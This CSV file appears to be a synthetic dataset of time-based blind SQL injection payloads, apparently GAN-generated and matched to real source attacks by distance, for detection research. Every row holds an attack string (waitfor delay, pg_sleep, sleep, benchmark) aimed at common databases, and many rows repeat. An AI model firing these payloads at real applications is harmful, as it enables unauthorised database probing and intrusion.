id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000090,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,5.1710289501026425
CTGAN_000091,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000209,6.293253476451942
CTGAN_000092,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,6.869804259470472
CTGAN_000093,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,6.62394942793916
CTGAN_000094,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000156,5.553277809343232
CTGAN_000095,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,8.499363026348343
CTGAN_000096,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,6.364362455993066
CTGAN_000097,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000034,7.053417051212267
CTGAN_000098,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,8.013200423073966
CTGAN_000099,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,8.002075799916728
CTGAN_000100,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",nearest_attack_euclidean,R000105,9.198389449002772
CTGAN_000101,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000116,6.731077742021672
CTGAN_000102,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000104,6.281647943328195
CTGAN_000103,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000227,6.943025256264808
CTGAN_000104,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000184,4.823908094982505
CTGAN_000105,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,6.858745972610499
CTGAN_000106,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000016,6.71730104006227
CTGAN_000107,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000035,6.20966026912169
CTGAN_000108,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'hokd'  =  'hokd,nearest_attack_euclidean,R000095,8.304384649926018
CTGAN_000109,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000122,7.1415333989504335
CTGAN_000110,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000025,6.892253923097532
CTGAN_000111,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,8.09218528631246
CTGAN_000112,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000016,7.018090328295048
CTGAN_000113,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,7.414225663729174
CTGAN_000114,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000034,7.276581303291541
CTGAN_000115,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,nearest_attack_euclidean,R000224,7.358717067242684
CTGAN_000116,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000025,7.399849413528108
CTGAN_000117,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,6.544701726966611
CTGAN_000118,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,6.749797695109713
CTGAN_000119,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000053,8.280288604814471
CTGAN_000120,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000039,7.339559691131277
CTGAN_000121,attack,time,"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",nearest_attack_euclidean,R000292,5.491858329119793
CTGAN_000122,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000259,5.837073310247694
CTGAN_000123,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,5.9173479259473485
CTGAN_000124,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,7.9699956001809715
CTGAN_000125,attack,time,"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000256,6.288148790063433
CTGAN_000126,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000012,7.993810661426242
CTGAN_000127,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000067,6.7045373097604335
CTGAN_000128,attack,time,"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000130,9.292324253660388
CTGAN_000129,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000277,6.481117539671804
CTGAN_000130,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000037,8.24524790002533
CTGAN_000131,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",nearest_attack_euclidean,R000105,6.246103671478819
CTGAN_000132,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000210,6.594136135601216
CTGAN_000133,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000253,6.122735024411351
CTGAN_000134,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000113,7.457469598569682
CTGAN_000135,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,7.86833437081226
CTGAN_000136,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",nearest_attack_euclidean,R000286,5.905416931257502
CTGAN_000137,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',nearest_attack_euclidean,R000216,8.201233379695216
CTGAN_000138,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000210,7.020467702972155
CTGAN_000139,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",nearest_attack_euclidean,R000105,7.245890733531939
CTGAN_000140,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,7.105707899044995
CTGAN_000141,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",nearest_attack_euclidean,R000105,6.8995590365965125
CTGAN_000142,attack,time,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000096,8.066265248273533
CTGAN_000143,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000122,6.181841515066286
CTGAN_000144,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000210,8.1482559960973
CTGAN_000145,attack,time,"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000256,6.6701622373516045
CTGAN_000146,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000289,6.290072614802472
CTGAN_000147,attack,time,1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000226,6.1236674388910615
CTGAN_000148,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,7.4072011452671624
CTGAN_000149,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000137,7.592002331706978
CTGAN_000150,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,6.034668809240056
CTGAN_000151,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.289883102326135
CTGAN_000152,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,6.304813215923433
CTGAN_000153,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000017,6.637283862373596
CTGAN_000154,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000108,6.994178013198046
CTGAN_000155,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000104,7.491530207508397
CTGAN_000156,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,5.694031840420731
CTGAN_000157,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000161,7.457030450074445
CTGAN_000158,attack,time,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000167,5.696785839629633
CTGAN_000159,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000214,6.4365689892064895
CTGAN_000160,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000288,5.403968942126948
CTGAN_000161,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,6.682542254057716
CTGAN_000162,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp,nearest_attack_euclidean,R000301,6.802074175991103
CTGAN_000163,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000210,8.214311067890534
CTGAN_000164,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000163,6.819456885238179
CTGAN_000165,attack,time,1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000189,8.251022797311906
CTGAN_000166,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000113,6.350263354691304
CTGAN_000167,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000097,7.156896554703938
CTGAN_000168,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000033,5.707345098698603
CTGAN_000169,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000265,7.002149538860393
CTGAN_000170,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",nearest_attack_euclidean,R000275,5.70296877081977
CTGAN_000171,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000025,6.693266594980062
CTGAN_000172,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000039,6.034054598081847
CTGAN_000173,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000221,6.8064868611419405
CTGAN_000174,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000068,5.431907227537817
CTGAN_000175,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000027,6.670872923309433
CTGAN_000176,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,6.780447207257164
CTGAN_000177,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000037,8.10316546939765
CTGAN_000178,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000233,7.746286081634925
